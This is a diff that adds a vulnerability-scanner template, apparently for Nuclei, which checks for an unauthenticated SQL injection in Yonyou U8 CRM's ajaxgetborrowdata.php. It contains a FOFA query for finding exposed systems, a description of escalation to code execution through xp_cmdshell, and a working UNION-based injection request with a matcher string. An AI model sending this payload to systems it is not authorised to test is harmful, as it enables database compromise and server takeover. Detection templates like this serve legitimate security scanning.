@@ -1,0 +1,34 @@
+id: yongyouU8-CRM-ajaxgetborrowdata_php-sql
+
+info:
+  name: "用友U8 CRM系统 ajaxgetborrowdata.php SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="用友U8CRM"
+      用友U8 CRM客户关系管理系统中/borrowout/ajaxgetborrowdata.php接口存在SQL注入安全缺陷。攻击者可未经身份验证构造恶意请求，通过SQL注入漏洞执行任意数据库查询，利用xp_cmdshell扩展存储过程实现文件系统写入操作，最终达成任意代码执行并获取服务器控制权限。该漏洞允许远程攻击者突破应用层安全防护，直接操作底层数据库并扩展至操作系统级别控制。
+  reference:
+  - https://mp.weixin.qq.com/s/ITXL8rw9puAbnFQgErXY1g?token=974751616&lang=zh_CN
+  tags: 用友
+
+
+http:
+- raw:
+  - |
+    POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    cWhCode=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%2899%29%2BCHAR%28105%29%2BCHAR%28114%29%2BCHAR%2887%29%2BCHAR%28120%29%2BCHAR%2874%29%2BCHAR%2866%29%2BCHAR%28106%29%2BCHAR%2885%29%2BCHAR%2898%29%2BCHAR%2886%29%2BCHAR%2874%29%2BCHAR%2875%29%2BCHAR%2868%29%2BCHAR%28108%29%2BCHAR%2899%29%2BCHAR%28114%29%2BCHAR%2890%29%2BCHAR%2867%29%2BCHAR%2874%29%2BCHAR%28114%29%2BCHAR%2873%29%2BCHAR%2876%29%2BCHAR%2877%29%2BCHAR%28101%29%2BCHAR%2870%29%2BCHAR%28122%29%2BCHAR%2888%29%2BCHAR%2886%29%2BCHAR%28103%29%2BCHAR%2881%29%2BCHAR%2899%29%2BCHAR%28107%29%2BCHAR%2865%29%2BCHAR%2868%29%2BCHAR%2867%29%2BCHAR%2885%29%2BCHAR%2876%29%2BCHAR%2879%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29--+KRVC
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qqvjqcirWxJBjUbVJKDlcrZCJrILMeFzXVgQckADCULOzqxzbq'
+  - type: status
+    status:
+    - 200
